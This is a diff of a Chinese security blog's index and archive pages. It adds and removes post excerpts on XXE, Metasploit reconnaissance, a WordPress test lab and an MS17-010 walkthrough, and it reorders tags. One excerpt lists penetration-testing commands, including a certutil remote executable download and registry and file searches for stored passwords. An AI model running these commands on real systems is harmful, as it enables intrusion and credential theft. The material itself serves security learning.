@@ -368,6 +368,157 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2020/08/05/XXE%E6%B3%A8%E5%85%A5payload/" >
+            
+                <span>XXE注入payload</span>
+        </a>
+        <div class="abstract-content">
+            libxml2.9.0之后默认不解析外部实体，php版本不影响XXE的利用web目录为：
+123456$ tree ..├── dom.php # 示例：使用DOMDocument解析body├── index.php├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body
+
+
+XML和DTD格式
+XML格式123456&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;fr...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/08/05</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "XXE">XXE</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/07/29/%E6%90%AD%E5%BB%BAwordpress%E7%8E%AF%E5%A2%83-docker-%E6%B5%8B%E8%AF%95plugin%E6%BC%8F%E6%B4%9E/" >
+            
+                <span>搭建wordpress环境(docker)测试plugin漏洞</span>
+        </a>
+        <div class="abstract-content">
+            参考链接：https://www.cnblogs.com/old-cha/p/12926434.html
+测试环境：kali linux2020技术：docker
+
+WordPress安装
+Docker拉取WordPress镜像1docker pull wordpress:latest
+Docker拉取MySQL镜像1docker pull mysql:5.6
+使用MySQL镜像运行容器1docker run -d --privileged=true --name OLDMysql -v /data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/07/29</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "bugs">bugs</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/07/23/metasploit%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0/" >
+            
+                <span>metasploit之信息收集学习</span>
+        </a>
+        <div class="abstract-content">
+            从《metasploit魔鬼训练营》第三章整理
+外围信息搜索外围信息搜索也叫“公开渠道信息收集”，可以google（OSINT）
+通过DNS和IP地址挖掘目标网络信息
+whois域名注册信息查询可以通过whois查询得到域名所有者、服务商、管理员邮件地址、域名注册日期和过期日期等等
+
+
+得到的Name Server也可以用于后面的nslookup和dig
+
+nslookup和dig域名查询
+
+nslookup查询（得到的一般是非权威应答）
+
+type=A(对IP地址进行解析)type=MX(查找邮件转发服务器)type=CNAME(别名记录)type=TXT(某条记录的说明)type=A...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/07/23</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "metasploit">metasploit</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "信息收集">信息收集</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/07/22/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" >
+            
+                <span>[转载]渗透基础-常用Windows命令大全</span>
+        </a>
+        <div class="abstract-content">
+            渗透命令ertutil—–从远程url下载文件
+案例:certutil -urlcache  -split  -f http://baidu.com/test.exe
+findstr—–查找文件后缀结果
+findstr /s /i “pass” .py
+reg query HKLM /f password /t REG_SZ /s—–搜集注册表中的各种密码数据
+查看有没有开启远程链接，运行下面命令：
+REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConne...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/07/22</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2020/07/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7-%E7%BD%91%E7%AB%99%E6%95%B4%E7%90%86/" >
             
                 <span>信息收集工具/网站整理</span>
@@ -633,163 +784,10 @@ example:建立文件夹parsing.asp和其下文件test.txt(test.txt的内容是&l
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/04/24/http%E5%90%84%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/" >
-            
-                <span>http各头部字段的含义（转载）</span>
-        </a>
-        <div class="abstract-content">
-            HTTP请求头
-HTTP 头部解释
-Accept：告诉WEB服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。 
-
-Accept-Charset： 浏览器申明自己接收的字符集Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法 （gzip，deflate）Accept-Language：：浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。 
-
-Accept-Ranges：WEB服务器表明自己是否接受...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "HTTP协议">HTTP协议</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/04/16/%E5%88%A9%E7%94%A8ms17-010%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB/" >
-            
-                <span>利用ms17-010漏洞进行攻击</span>
-        </a>
-        <div class="abstract-content">
-            打开kali Linux第一次运行msfconsole需要启动postgresql服务并且初始化
-执行下面的代码：
-12service postgresql startmsfdb init
-
-运行msfconcole1msfconsole
-
-会出现下面的情况（显示的内容不确定）
-
-搜索ms17-010漏洞1search ms17-010
-显示出5个可选用的模块
-选择1并填写要探测的目标IP地址
-探测成功
-选择3payload123show payloadsset paylaod 15
-
-
-填写目标IP地址和本地监听IP地址12set rhosts 192.168.1.44set lhos...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/16</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "bugs">bugs</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/04/12/MySQL%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%881%EF%BC%89/" >
-            
-                <span>MySQL的基础操作（1）</span>
-        </a>
-        <div class="abstract-content">
-            本章介绍一些MySQL的基本操作
-启动与停止MySQL服务启动MySQL服务1net start mysql;
-
-停止MySQL服务1net stop mysql;
-
-MySQL的登录与退出查看MySQl版本1mysql -V;
-此处是大写的V
-基本的登录操作1mysql -u root -p -P 3306 -h 127.0.0.1;
-Tips:就算不写-P 3306和-h 127.0.0.1默认也会这么填写
-MySQL退出以下三种任意选一种都可以退出数据库
-123mysql&gt;exit;mysql&gt;quit;mysql&gt;\q;
-修改MySQl提示符在登录的时候结尾加上...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "sql">sql</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "MySQL">MySQL</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/04/06/First-Blog/" >
-            
-                <span class="stick-top iconfont-archer">&#xe63d;</span>
-                
-                <span>First Blog</span>
-        </a>
-        <div class="abstract-content">
-            Welcome to my own blog!It’s my pleasure to make friends with you,if you are avaliable to view my website,I will be appreciate,next few years I will upload my blog here…..
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/06</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "intro">intro</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/page/11/">&lt; PREV</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span>
+        <a class="extend prev" rel="prev" href="/page/11/">&lt; PREV</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/13/">NEXT &gt;</a>
     </nav>
     
 </main>
@@ -2958,9 +2956,77 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 120
+        Total : 124
         </div>
         <!-- search  -->
         
@@ -2977,6 +3043,26 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2021/11/01/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-sql%E6%B3%A8%E5%85%A5/" >javaweb漏洞学习(sql注入)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2021/10/26/%E6%97%A0%E5%8F%82%E6%95%B0rce%E6%96%B0%E8%A7%A3%E6%B3%95-2021%E6%85%95%E6%B5%8Bweb%E5%BA%94%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B5%9Bnorce/" >无参数rce新解法(2021慕测web应用个人赛norce)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2021/10/23/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" >Android安全之环境搭建及基础知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/19</span><a class="archive-post-title" href= "/2021/10/19/TP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" >TP6.0.X反序列化链漏洞分析</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -3594,9 +3680,9 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
-    
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
@@ -3632,17 +3718,17 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
-    
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
+        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
+        <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
     
@@ -3684,9 +3770,9 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
-    
         <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
@@ -3694,37 +3780,37 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
         <span class="sidebar-tag-name" data-tags=".htaccess利用"><span class="iconfont-archer">&#xe606;</span>.htaccess利用</span>
     
+        <span class="sidebar-tag-name" data-tags="HTTP协议"><span class="iconfont-archer">&#xe606;</span>HTTP协议</span>
+    
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
     
         <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
     
-        <span class="sidebar-tag-name" data-tags="HTTP协议"><span class="iconfont-archer">&#xe606;</span>HTTP协议</span>
+        <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
     
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
-        <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
-    
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
-        <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
-    
         <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
-        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
-    
-        <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="2019CISCN"><span class="iconfont-archer">&#xe606;</span>2019CISCN</span>
     
+        <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
         <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
     
-        <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
+        <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
         <span class="sidebar-tag-name" data-tags="提权"><span class="iconfont-archer">&#xe606;</span>提权</span>
     
@@ -3738,9 +3824,9 @@ MySQL退出以下三种任意选一种都可以退出数据库
     
         <span class="sidebar-tag-name" data-tags="变量覆盖漏洞"><span class="iconfont-archer">&#xe606;</span>变量覆盖漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="扫描软件"><span class="iconfont-archer">&#xe606;</span>扫描软件</span>
-    
         <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
+    
+        <span class="sidebar-tag-name" data-tags="扫描软件"><span class="iconfont-archer">&#xe606;</span>扫描软件</span>
     
         <span class="sidebar-tag-name" data-tags="Django"><span class="iconfont-archer">&#xe606;</span>Django</span>
     
